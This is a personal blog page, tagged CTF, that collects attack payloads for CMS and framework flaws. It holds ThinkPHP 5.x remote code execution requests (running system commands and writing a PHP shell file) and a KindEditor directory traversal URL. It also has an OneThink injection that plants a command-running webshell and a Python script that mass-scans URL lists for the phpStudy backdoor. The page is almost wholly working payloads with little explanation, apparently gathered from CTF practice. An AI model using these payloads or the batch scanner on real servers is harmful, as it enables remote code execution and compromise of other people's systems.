@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>遇到过的cms和框架的漏洞 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="ThinkPHP 5.0.x&amp;#x3001;5.1.x&amp;#x3001;5.2.x &amp;#x5168;&amp;#x7248;&amp;#x672C;REC(&amp;#x8FDC;&amp;#x7A0B;&amp;#x547D;&amp;#x4EE4;&#x2F;&amp;#x4EE3;&amp;#x7801;&amp;#x6267;&amp;#x884C;&amp;#x6F0F;&amp;#x6D1E;)123index.php?s&#x3D;captchapost:_method&#x3D;__construct&amp;am">
+<meta property="og:type" content="article">
+<meta property="og:title" content="遇到过的cms和框架的漏洞">
+<meta property="og:url" content="http://example.com/2019/12/04/%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84cms%E5%92%8C%E6%A1%86%E6%9E%B6%E7%9A%84%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ThinkPHP 5.0.x&amp;#x3001;5.1.x&amp;#x3001;5.2.x &amp;#x5168;&amp;#x7248;&amp;#x672C;REC(&amp;#x8FDC;&amp;#x7A0B;&amp;#x547D;&amp;#x4EE4;&#x2F;&amp;#x4EE3;&amp;#x7801;&amp;#x6267;&amp;#x884C;&amp;#x6F0F;&amp;#x6D1E;)123index.php?s&#x3D;captchapost:_method&#x3D;__construct&amp;am">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-12-03T20:26:45.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:55:32.155Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            遇到过的cms和框架的漏洞
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-12-03T20:26:45.000Z" itemprop="datePublished">4 Dec 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Web/">Web</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            3 minutes read (About 452 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h3 id="ThinkPHP-5-0-x&#x3001;5-1-x&#x3001;5-2-x-&#x5168;&#x7248;&#x672C;REC-&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;-&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;"><a href="#ThinkPHP-5-0-x&#x3001;5-1-x&#x3001;5-2-x-&#x5168;&#x7248;&#x672C;REC-&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;-&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;" class="headerlink" title="ThinkPHP 5.0.x&#x3001;5.1.x&#x3001;5.2.x &#x5168;&#x7248;&#x672C;REC(&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;/&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;)"></a>ThinkPHP 5.0.x&#x3001;5.1.x&#x3001;5.2.x &#x5168;&#x7248;&#x672C;REC(&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;/&#x4EE3;&#x7801;&#x6267;&#x884C;&#x6F0F;&#x6D1E;)</h3><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=captcha</span><br><span class="line">post:</span><br><span class="line">_method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x547D;&#x4EE4;payload(&#x4E0D;&#x552F;&#x4E00;):</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x5199;&#x6587;&#x4EF6;payload(&#x4E0D;&#x552F;&#x4E00;):</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i</span><br></pre></td></tr></tbody></table></figure>
+
+<a id="more"></a>
+
+
+<h3 id="kindeditor&#x7F16;&#x8F91;&#x5668;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x904D;&#x5386;&#x6F0F;&#x6D1E;"><a href="#kindeditor&#x7F16;&#x8F91;&#x5668;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x904D;&#x5386;&#x6F0F;&#x6D1E;" class="headerlink" title="kindeditor&#x7F16;&#x8F91;&#x5668;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x904D;&#x5386;&#x6F0F;&#x6D1E;"></a>kindeditor&#x7F16;&#x8F91;&#x5668;&#x7684;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x904D;&#x5386;&#x6F0F;&#x6D1E;</h3><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2c0bc5a13a96421a844a8ec8ec3743efc0c7f53181614fcc.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="OneThink-CMS&#x7684;&#x7F13;&#x5B58;&#x6F0F;&#x6D1E;"><a href="#OneThink-CMS&#x7684;&#x7F13;&#x5B58;&#x6F0F;&#x6D1E;" class="headerlink" title="OneThink CMS&#x7684;&#x7F13;&#x5B58;&#x6F0F;&#x6D1E;"></a>OneThink CMS&#x7684;&#x7F13;&#x5B58;&#x6F0F;&#x6D1E;</h3><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x65B0;&#x5EFA;&#x7528;&#x6237;</span><br><span class="line">%0a$a=$_GET[a];#%0asystem($a);#</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x8BB0;&#x5F97;urldecode<br>&#x7136;&#x540E;&#x8BBF;&#x95EE;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="phpstudy&#x540E;&#x95E8;&#x68C0;&#x6D4B;"><a href="#phpstudy&#x540E;&#x95E8;&#x68C0;&#x6D4B;" class="headerlink" title="phpstudy&#x540E;&#x95E8;&#x68C0;&#x6D4B;"></a>phpstudy&#x540E;&#x95E8;&#x68C0;&#x6D4B;</h3><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> gevent</span><br><span class="line"><span class="hljs-keyword">from</span> gevent <span class="hljs-keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_read</span>(<span class="hljs-params">file_name=<span class="hljs-string">&quot;http-200-list.txt&quot;</span></span>):</span></span><br><span class="line">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_name, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">        <span class="hljs-keyword">return</span> [i.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">url</span>):</span></span><br><span class="line">    <span class="hljs-string">&apos;&apos;&apos;</span></span><br><span class="line"><span class="hljs-string">    if &quot;http://&quot; or &quot;https://&quot; not in url:</span></span><br><span class="line"><span class="hljs-string">        url = &quot;https://&quot; + url</span></span><br><span class="line"><span class="hljs-string">    &apos;&apos;&apos;</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="hljs-string">&apos;User-Agent&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Sec-Fetch-Mode&apos;</span>: <span class="hljs-string">&apos;navigate&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Sec-Fetch-User&apos;</span>: <span class="hljs-string">&apos;?1&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Accept&apos;</span>: <span class="hljs-string">&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Sec-Fetch-Site&apos;</span>: <span class="hljs-string">&apos;none&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Accept-Charset&apos;</span>: <span class="hljs-string">&apos;ZWNobyBlZVN6eHU5Mm5JREFiOw==&apos;</span>,  <span class="hljs-comment"># &#x8F93;&#x51FA; eeSzxu92nIDAb</span></span><br><span class="line">        <span class="hljs-string">&apos;Accept-Encoding&apos;</span>: <span class="hljs-string">&apos;gzip,deflate&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Accept-Language&apos;</span>: <span class="hljs-string">&apos;zh-CN,zh;q=0.9&apos;</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        res = rq.get(url, headers=headers, timeout=<span class="hljs-number">3</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">            res.text.find(<span class="hljs-string">&apos;eeSzxu92nIDAb&apos;</span>)</span><br><span class="line">            <span class="hljs-comment">#print(res.text.find(&apos;eeSzxu92nIDAb&apos;))</span></span><br><span class="line">            <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&apos;eeSzxu92nIDAb&apos;</span>)&gt;-<span class="hljs-number">1</span>:</span><br><span class="line">                print(<span class="hljs-string">&quot;[&#x5B58;&#x5728;&#x6F0F;&#x6D1E;] &quot;</span> + url)</span><br><span class="line">                f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ok.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>)</span><br><span class="line">                f.write(<span class="hljs-string">&quot;[&#x5B58;&#x5728;&#x6F0F;&#x6D1E;] &quot;</span> + url+<span class="hljs-string">&quot;\n&quot;</span>)</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">            	print(<span class="hljs-string">&quot;[&#x4E0D;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;] &quot;</span> + url)</span><br><span class="line">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">        <span class="hljs-comment">#raise e</span></span><br><span class="line">        print(<span class="hljs-string">&quot;[&#x8D85;&#x65F6;] &quot;</span> + url)</span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    print(<span class="hljs-string">&quot;phpStudy &#x6279;&#x91CF;&#x68C0;&#x6D4B; (&#x9700;&#x8981; gevent,requests &#x5E93;)&quot;</span>)</span><br><span class="line">    print(<span class="hljs-string">&quot;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#xFF0C;&#x8BF7;&#x5C06;URL&#x4FDD;&#x5B58;&#x4E3A; url.txt &#x653E;&#x7F6E;&#x6B64;&#x7A0B;&#x5E8F;&#x540C;&#x76EE;&#x5F55;&#x4E0B;&quot;</span>)</span><br><span class="line">    <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&#x4EFB;&#x610F;&#x6309;&#x952E;&#x5F00;&#x59CB;&#x6267;&#x884C;..&quot;</span>)</span><br><span class="line">    tasks = [gevent.spawn(check, url) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> file_read()]</span><br><span class="line">    print(<span class="hljs-string">&quot;&#x6B63;&#x5728;&#x6267;&#x884C;...&#x8BF7;&#x7B49;&#x5019;&quot;</span>)</span><br><span class="line">    gevent.joinall(tasks)</span><br><span class="line">    wait = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&#x6267;&#x884C;&#x5B8C;&#x6BD5; &#x4EFB;&#x610F;&#x952E;&#x9000;&#x51FA;...&quot;</span>)</span><br></pre></td></tr></tbody></table></figure></body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/CTF/">#CTF</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/12/04/PHP%E5%86%85%E6%A0%B8/">PHP内核</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/12/03/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">php文件包含</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
